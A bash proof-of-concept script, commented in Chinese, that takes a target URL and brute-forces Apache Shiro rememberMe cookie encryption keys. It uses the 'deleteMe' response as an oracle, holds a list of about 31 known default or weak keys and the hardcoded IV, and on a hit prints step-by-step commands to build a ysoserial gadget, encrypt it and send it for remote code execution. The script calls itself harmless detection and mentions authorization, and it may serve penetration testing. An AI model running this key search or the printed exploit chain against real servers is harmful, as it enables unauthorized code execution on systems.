#!/usr/bin/env bash
# ============================================================================
# Shiro rememberMe key 无害探测
# 用法: ./poc.sh https://TARGET
#       ./poc.sh https://TARGET /path/with/shiro
#
# 【判据】为什么 deleteMe 能作为 oracle
#   Shiro 的 CookieRememberMeManager.processRememberMeCookie():
#       decrypt(cookie) 成功  → 继续 deserialize  → 失败 → catch → forgetIdentity()
#       decrypt(cookie) 失败  → 直接 return（不发任何 Set-Cookie）
#   forgetIdentity() 的实现就是向响应写 rememberMe=deleteMe。
#
#   所以我们**不需要**有效的 gadget 链：只要 AES 解密能成功（key 对），
#   后续 deserialize 必然失败，服务端就会吐 deleteMe。
#
#   反过来：key 错 → decrypt 抛 CryptoException → 静默返回 → 无 deleteMe。
#   这就是一个「key 是否正确」的布尔信道，且不触发任何 RCE。
#
# 【IV】Shiro 默认 IV 硬编码在 CookieRememberMeManager 的构造里，
#   BASE64 = "kPH+bIxk5D2deZiIxcaaaA=="（16 字节）。改了 IV 的实现极罕见。
#
# 【常见误报】
#   1. 前面挂了 WAF/反代，把 Cookie 剥掉 → 永远没 deleteMe，看起来像「key 全错」。
#      排除: 先发一个明显畸形 Cookie，看是否被原样记录（对比响应头）。
#   2. 应用自己也写了 rememberMe Cookie（非 Shiro）→ 可能恒发 deleteMe。
#      排除: 先发 rememberMe=AAAA（非法 base64 长度），若仍 deleteMe → 不是 oracle。
#   3. 未登录态下 Shiro 根本不处理该 Cookie（filter chain 未覆盖路径）。
#      排除: 换几个路径重试，只要有任一触发就说明 filter 生效。
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

BASE="${1:-}"; EXTRA_PATH="${2:-}"
[ -z "$BASE" ] && usage_die "$0 <https://TARGET> [/path]"
BASE="${BASE%/}"
URL="$BASE$EXTRA_PATH"

IV_B64="kPH+bIxk5D2deZiIxcaaaA=="
IV_HEX=$(printf '%s' "$IV_B64" | base64 -d 2>/dev/null | xxd -p -c 64)
[ "${#IV_HEX}" = 32 ] || { err "IV 解码异常，检查 base64"; exit 1; }

# 主流 Shiro key（公开默认值 + 常见弱 key）。命中即在 next step 生成反序列化 payload。
KEYS=(
  "kPH+bIxk5D2deZiIxcaaaA=="
  "2AvVhdsgUs0FSA3SDFAdag=="
  "3AvVhmFLUs0KTA3Kprsdag=="
  "4AvVhmFLUs0KTA3Kprsdag=="
  "5AvVhmFLUs0KTA3Kprsdag=="
  "6ZmI6I2j5Y+R5aSn5ZOlAA=="
  "wGiHplamyXlVB11UXWol8g=="
  "Z3VucwAAAAAAAAAAAAAAAA=="
  "fCq+/s4N5WZ0DkF+eJQPpQ=="
  "bWljcm9zAAAAAAAAAAAAAA=="
  "MTIzNDU2Nzg5MGFiY2RlZg=="
  "U3ByaW5nQmxhZGUAAAAAAA=="
  "ZUdsaGJuSmxibVI2ZHc9PQ=="
  "L7RioUULEFhRyxAB8gr7oQ=="
  "RVZBTk5JR0hUTFlfV0FPVQ=="
  "WcfHGU25gNnTxTlmJMeSpw=="
  "a2VlcE9uR29pbmdBbmRGaQ=="
  "bWluZS1hc3NvY2lhdGlvbg=="
  "cmVtZW1iZXJNZQAAAAAAAA=="
  "YWJjZGVmZ2hpamtsbW5vcA=="
  "a3BhY2Vyc2l0ZQAAAAAAAA=="
  "OHhLoz5hWRasGd4RJsOzzQ=="
  "C+3hFGPjbgzGdrC+MHc+ZQ=="
  "r0e3c16IdVkouZgk1TKVMg=="
  "5aaC5qKm5oqA5pyvAAAAAA=="
  "1QWLxg+NYmxraMoxAXu/Iw=="
  "ZBfKHaOohj7c9HWnN1bQ+w=="
  "L/hZdU6SmOLWAJCx0SDUfQ=="
  "aU1pcmFjbGVpTWlyYWNsZQ=="
  "bXRvYmlsZQAAAAAAAAAAAA=="
  "skZpbmFsQmxhZGUAAAAAAA=="
)

# ---- 前置: 确认这是不是 oracle -------------------------------------------
log "前置校验: 该 Cookie 是否被 Shiro 处理"

# ① 畸形 payload（非法 base64，长度为 0）——若仍 deleteMe，说明 deleteMe 是常量，不是 oracle
c0=$(reqc GET "$URL" -H 'Cookie: rememberMe=' -D /tmp/_shiro_h0 -o /dev/null)
grep -qi 'rememberMe=deleteMe' /tmp/_shiro_h0 2>/dev/null && {
  warn "空 Cookie 也返回 deleteMe → deleteMe 是常量，本 oracle 不成立"
  warn "改用时间盲注或直接测已知 key 的 gadget 链"
}

# ② 记录一个「必然错误」的 key 作阴性对照
BAD_HEX=$(head -c 16 /dev/urandom | xxd -p -c 32)
BAD_PAYLOAD=$(printf 'AAAA' | openssl enc -aes-128-cbc -K "$BAD_HEX" -iv "$IV_HEX" \
              -nosalt -base64 -A 2>/dev/null)
curl -sk --max-time "$TIMEOUT" -A "$UA" -D /tmp/_shiro_hbad -o /dev/null \
     -H "Cookie: rememberMe=$BAD_PAYLOAD" "$URL" 2>/dev/null
grep -qi 'rememberMe=deleteMe' /tmp/_shiro_hbad && {
  warn "随机 key 也返回 deleteMe → 服务端不做解密校验，oracle 不可用"
}
rm -f /tmp/_shiro_h0 /tmp/_shiro_hbad

# ---- 主循环 ---------------------------------------------------------------
log "探测 $((${#KEYS[@]})) 个候选 key → $URL"
HIT=""
i=0
for k in "${KEYS[@]}"; do
  i=$((i+1))
  khex=$(printf '%s' "$k" | base64 -d 2>/dev/null | xxd -p -c 64)
  [ "${#khex}" = 32 ] || { dim "跳过非法 key: $k"; continue; }

  payload=$(printf 'AAAAAAAAAAAAAAAA' | \
    openssl enc -aes-128-cbc -K "$khex" -iv "$IV_HEX" -nosalt -base64 -A 2>/dev/null)
  [ -z "$payload" ] && { err "openssl 加密失败"; continue; }

  hdr=$(curl -sk --max-time "$TIMEOUT" -A "$UA" -D - -o /dev/null \
        -H "Cookie: rememberMe=$payload" "$URL" 2>/dev/null)

  if printf '%s' "$hdr" | grep -qi 'rememberMe=deleteMe'; then
    ok "KEY 命中: $k   (第 $i/${#KEYS[@]})"
    HIT="$k"
    break
  fi
  [ $((i % 8)) -eq 0 ] && dim "已试 $i/${#KEYS[@]}"
  sleep "$SLEEP"
done

echo
if [ -n "$HIT" ]; then
  ok "有效 key = $HIT"
  cat <<EOF

下一步（不自动执行，需你确认授权范围）：
  1. 生成 CommonsBeanutils1 / CommonsCollectionsK1 gadget:
       java -jar ysoserial.jar CommonsBeanutils1 'id' > payload.bin
  2. AES-CBC 加密（key 取上面命中值，IV 同上）:
       openssl enc -aes-128-cbc -K \$(printf %s "$HIT" | base64 -d | xxd -p -c 64) \\
         -iv $IV_HEX -nosalt -in payload.bin -out payload.enc
  3. 发送:
       curl -b "rememberMe=\$(base64 -w0 payload.enc)" \$TARGET

注意: gadget 链取决于目标 CLASSPATH 里的库版本。Shiro 现已补丁到 1.2.5+
      且强制 AES-GCM 的版本无法用此 key 直接打通，需先确认版本。
EOF
else
  warn "未命中。三种可能，逐条排除："
  dim "① key 不在表中 → 试 wget 收集的 Shiro 500 key 全表 / 从源码或配置泄露获取"
  dim "② 目标非 Shiro → curl -I 看 X-Powered-By / 报错页 / Cookie 名（JSESSIONID+rememberMe 才是 Shiro 特征）"
  dim "③ filter 未覆盖该路径 → 试 /login /admin /index /（部分配置只对特定 path 生效）"
fi
